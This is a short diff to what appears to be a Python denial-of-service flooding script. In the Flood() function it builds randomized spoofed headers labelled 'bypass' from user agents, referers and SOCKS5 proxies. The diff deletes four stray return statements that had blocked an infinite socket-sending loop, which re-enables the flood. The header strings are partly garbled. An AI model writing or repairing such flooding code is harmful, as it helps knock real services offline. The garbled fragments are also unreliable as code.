@@ -160,10 +160,6 @@ def Flood():
   userpy = "UserAgents: Connection-utf8-utf7, \r\nAccept-Language: "+random.choice(useragents) + random.choice(ref)+random.choice(socks5)+"\r\n"
   socks = random.choice(socks5)
   bypass = connection + connection2 + refall + userpy + socks + "\r\n"
-  return byte5
-  return byte4
-  return byte3
-  return byte7
   while True:
         try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
